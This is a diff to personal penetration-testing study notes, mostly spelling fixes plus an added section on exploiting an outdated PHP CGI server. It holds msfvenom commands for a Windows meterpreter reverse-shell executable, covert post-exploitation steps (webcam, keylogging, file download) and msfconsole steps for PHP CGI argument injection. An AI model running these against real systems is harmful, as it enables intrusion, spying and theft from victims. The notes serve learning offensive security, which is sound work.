@@ -76,7 +76,7 @@ metasploit
       show options // ask what options he needs to run the scan
 
   msfvenom -p <payload> LHOST=<your_ip> LPORT=<your_port> -f <format> -o <filename> // anyport, if (exe, elf, raw), payload (traffic type(encrypted, not encrypted))
-    -f vba (used to explot vulnerabilities in Microsoft Office documents  like word/excell macros)
+    -f vba (used to exploit vulnerabilities in Microsoft Office documents  like word/excell macros)
     -f apk: for melicious android applications to exploit android devices
     msfvenom -p windows/meterpreter/reverse_tcp LHPST=my_ap_adress LPORT=4444 -f exe -o shell.exe
 
@@ -91,7 +91,7 @@ metasploit
 
     now on windows execute payload.exe
     now I get session
-      // post explotation
+      // post exploitation
       command: screenshot, shell, download
       I can open the webcam without victim knowledge, manage files, record keystrokes
 
@@ -155,3 +155,14 @@ Telnet
     run
 
 HTTP protocol
+  -(http) sniffing (unencrypted transmission) using bettercap, wireshark
+  -server API //CGI/FastCGI, php version 5.2.4-2ubuntu5.10
+    msfconsole
+    search php cgi
+    now we googled: php version 5.2.4 cgi exploit. we found that this version is vulnerable to php cgi arg injection
+    use 8
+    show options
+    set RHOST my target // LHOST is my ip
+    run
+    shell
+  mitigations: use https instead of http and continues scan of CVES (nuclei tool, nessus, openVAS)
